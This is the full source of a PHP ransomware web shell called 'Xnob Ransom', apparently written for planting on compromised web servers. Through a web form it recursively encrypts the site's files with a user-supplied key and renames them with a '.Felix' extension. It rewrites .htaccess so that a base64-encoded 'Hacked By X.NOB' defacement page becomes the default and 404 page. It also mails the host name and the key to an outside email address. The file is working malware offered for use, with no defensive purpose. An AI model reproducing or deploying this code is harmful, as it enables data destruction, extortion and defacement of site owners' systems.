<!DOCTYPE html>
<html>
<head>
   <title>XNOB FT felix</title>
<style type="text/css">
body {
    background: #1A1C1F;
    color: #e2e2e2;
}
.inpute{ 
    border-style: dotted;
    border-color: #379600;
    background-color: transparent;
    color: white;
    text-align: center;
}
.selecte{
    border-style: dotted;
    border-color: #00FF90;
    background-color: transparent;
    color: green;
}
.submite{
       border-style: dotted;
    border-color: #F200FF;
    background-color: transparent;
    color: white;
}
.result{
  text-align: left;
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htarein")){
      rename(".htaccess", ".htarein");
      if(fwrite(fopen('.htaccess', 'w'), "#By Felix stup\r\nDirectoryIndex Xnob.php\r\nErrorDocument 404 /Xnob.php")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
      }
      if(file_put_contents("Xnob.php", base64_decode("CjxodG1sPgo8aGVhZD4KPCEtLS0tLSBDcmVhdGVkIEJ5IFguTk9CIC0tLS0tPgo8dGl0bGU+SGFja2VkIEJ5IFguTk9CIDwvdGl0bGU+CjxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJbIEJMQUNLSEFUIEhFUk9FUyBdIj4KPGlmcmFtZSB3aWR0aD0iMCIgaGVpZ2h0PSIwIiBhbGxvdz0iYXV0b3BsYXkiIHNyYz0iaHR0cHM6Ly9nLnRvcDR0b3AubmV0L21fMTQzOG9jOHVpMS5tcDMiIGZyYW1lYm9yZGVyPSIwIiBhbGxvd2Z1bGxzY3JlZW4+PC9pZnJhbWU+CjwvaGVhZD4KPGxpbmsgaHJlZj0naHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PURvc2lzJyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz4KPGxpbmsgaHJlZj0naHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVNlZGd3aWNrIEF2ZScgcmVsPSdzdHlsZXNoZWV0JyB0eXBlPSd0ZXh0L2Nzcyc+Cjxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kOmJsYWNrO2NvbG9yOndoaXRlIj48Y2VudGVyPjxkaXYgY2xhc3M9ImZvdXItemVyby1mb3VyLWNvbnRhaW5lciI+PGRpdiBjbGFzcz0iY29kZSI+PGltZyBzcmM9IiI8ZGl2IGNsYXNzPSJmb3VyLXplcm8tZm91ci1jb250YWluZXIiPjxkaXYgY2xhc3M9ImNvZGUiPjxmb250IHNpemU9IjUiIHN0eWxlPSJjb2xvcjp3aGl0ZTtmb250LWZhbWlseTpTZWRnd2ljayBBdmU7Ij48YnI+SGFja2VkIEJ5IFguTk9CIDwvZm9udD48L2Rpdj48ZGl2IGNsYXNzPSJtZXNzYWdlIj48YnI+PGZvbnQgZmFjZT0iRG9zaXMiIHNpemU9IjMiIGNvbG9yPSJ3aGl0ZSI+QmxhY2toYXQgSGVyb2VzPGJyPjxicj5bIFNoMDB0eiBdPGJyPjxtYXJxdWVlIGFsaWduPSJjZW50ZXIiIHNjcm9sbGFtb3VudD0iMTAiIHdpZHRoPSIzNzAiPiA8Zm9udCBzaXplPSczJyBjb2xvcj0nd2hpdGUnPlhzdnMgSGFja2VyJ3MgLSBNci5Xb2x2ZXJpbmUgLSAuL1dhbGtlcjg4MCAtIEhpdGxlck5vdEZvdW5kIC0gLi94Q3JvZnRlciAtIFRSWiBGSlIgLSBNRmFocmlTIC0gSmF2YSBCQlQgLSBVbnJhdmVsNzIgLSAuL0dlYmJ5IC0gLi9NciBCZWVleCAtIEFzZWNkeTcgLSBKLmlkIC0gV3VtYm8gLSBYc3RyZXNzIC0gQWR6a2kgLSAuL1M3NExLM1IgLSBwYXBvcGUgLSA8Zm9udCBjb2xvcj0icmVkIj5YLk5PQiA8L2ZvbnQ+ICA8L2ZvbnQ+PC9tYXJxdWVlPjxicj48YnI+PGI+QmxhY2toYXQgSGVyb2VzPGZvbnQgZmFjZT0iRG9zaXMiIHNpemU9IjMiIGNvbG9yPSJyZWQiPiY8Zm9udCBmYWNlPSJEb3NpcyIgc2l6ZT0iMyIgY29sb3I9IndoaXRlIj4gY29weXJpZ2h0wqkyMDIwPC9iPjwvZGl2PjwvZm9udD48L2NlbnRlcj48L2JvZHk+PC9oZWFkPjwvaHRtbD4=
"))){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  Felix.php (Default Page)<br>';
      }
    }
   }
   public function shcpackUnstall(){

      if( file_exists(".htarein") ){
        if( unlink(".htaccess") && unlink("Xnob.php") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> Felix.php (Default Page)<br>';
        }
        rename(".htarein", ".htaccess");
      }

   }

   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"25.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"Xnob.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htarein") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
        deRanSomeware::report($key);
   }

   public function report($key){
        $message.= "=========          Kentod 02        =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "Key     : ".$key;
        $message.= "========= Felix Kang Recod=========\n";
        $subject = "Report Ransomeware";
        $headers = "From: Ransomware <ransomeware@shor7cut.today>\r\n";
        mail("-- Spro1713@gmail.com --",$subject,$message,$headers);
   }

   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".Felix");
        break;
        case '2':
          $locates = str_replace(".Felix", "", $locate);
          rename($locate, $locates);
        break;
      }
   }

   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );

      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }

   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));

      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }



   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}

if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}else{
?>
<center>
<pre>
Xnob Ransom 
by credit Felix stup
tangks Xnob
yg udah menyoba atau suport 
 -[ Contact : spro1714@gmail.com ]-
</pre>
<form action="" method="post" style=" text-align: center;">
      <label>Key : </label>
      <input type="text" name="key" class="inpute" placeholder="coli">
      <select name="method" class="selecte">
         <option value="1">Infection</option>
         <option value="2">DeInfection</option>
      </select>
      <input type="submit" name="submit" class="submite" value="Submit" />
</form>
<?php
}?>
</div>
</body>
</html>


<?php

?>
